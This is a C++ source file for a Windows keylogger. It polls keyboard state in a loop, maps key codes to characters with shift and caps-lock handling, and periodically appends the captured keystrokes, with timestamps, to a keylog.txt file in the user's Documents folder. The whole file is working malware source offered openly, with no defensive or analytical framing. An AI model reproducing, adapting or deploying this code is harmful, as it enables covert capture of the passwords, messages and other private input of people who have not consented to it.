// Keylogger.cpp

#include <iostream>
#include <Windows.h>
#include <winuser.h>
#include <fstream>
#include <string>
#include <stdio.h>
#include <array>
#include <stdexcept>
#include <memory>
#include <Lmcons.h>
using namespace std;

// executes a command and returns the output as a string
string exec(string incmd) {
	const char* cmd = incmd.c_str();
	array<char, 128> buffer;
	string result;
	unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) {
		throw runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

#define winlen 51

// windows key codes
const char winkeylist[] = { '\b', '\t', '\n', ' ', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ';', '=', ',', '-', '.', '/', '`' ,'[', '\\', ']', '\''};
const char altkeylist[] = { '\b', '\t', '\n', ' ', ')', '!', '@', '#', '$', '%', '^', '&', '*', '(', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ':', '+', '<', '_', '>', '?', '~' , '{', '|' , '}', '\"'};
const int wincodelist[] = { 8,    9,    13,   32,  48,  49,  50,  51,  52,  53,  54,  55,  56,  57,  65,  66,  67,  68,  69,  70,  71,  72,  73,  74,  75,  76,  77,  78,  79,  80,  81,  82,  83,  84,  85,  86,  87,  88,  89,  90,  186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222 };

char getwinkey(int wincode, bool alt = false) {
	for (int i = 0; i < winlen; i++) {
		if (wincode == wincodelist[i]) {
			if (alt) return altkeylist[i];
			else return winkeylist[i];
		}
	}
	return NULL;
}

int main()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;

	if (GetUserNameA(username, &username_len)) {
		std::cout << "Username: " << username << std::endl;
	}
	else {
		std::cerr << "Error getting username.\n";
	}

	string logpath = "C:\\Users\\" + string(username) + "\\Documents\\keylog.txt";
	cout << logpath;

	int temp;
	BYTE arr[256];
	BYTE arr_prev[256];
	bool shift = false;

	string outstring = "";
	int repetitions = 0;

	while (1)
	{
		// get status of shift key
		if (GetKeyState(VK_SHIFT) <= -127) {
			//cout << "SHIFT = TRUE" << endl;
			shift = true;
		}
		else shift = false;

		// gets current key presses and writes them to outstring
		memset(arr, 0, sizeof(256));
		GetKeyState(0);
		if (GetKeyboardState(arr))
		{
			for (int i = 0; i < 256; i++)
			{
				temp = (int)arr[i];
				temp >>= 7;
				if (temp == 1 && arr[i] != arr_prev[i] && getwinkey(i) != NULL) {
					if ((shift xor (int)arr[VK_CAPITAL])) {
						outstring += getwinkey(i, true);
						//cout << getwinkey(i, true);
					}
					else {
						outstring += getwinkey(i, false);
						//cout << getwinkey(i, false);
					}
				}
			}
			Sleep(40);
		}
		for (int i = 0; i < 256; i++) {
			arr_prev[i] = arr[i];
		}

		repetitions++;
		
		// writes the logs to a file
		if (!(repetitions % 1500)) {
			if (outstring != "") {
				ofstream fout(logpath, std::ios::app);
				if (fout.is_open()) {
					cout << "WROTE " << outstring.size() << " BYTES TO " << logpath << endl;
					if (repetitions == 7500) {
						fout << "\n" << exec("date /t") << exec("time /t") << "\n";
						repetitions = 0;
					}
					fout << outstring;
					outstring = "";
					fout.close();
				}
				else {
					cerr << "Could not open " << logpath << endl;
				}
			}
		}
	}
}
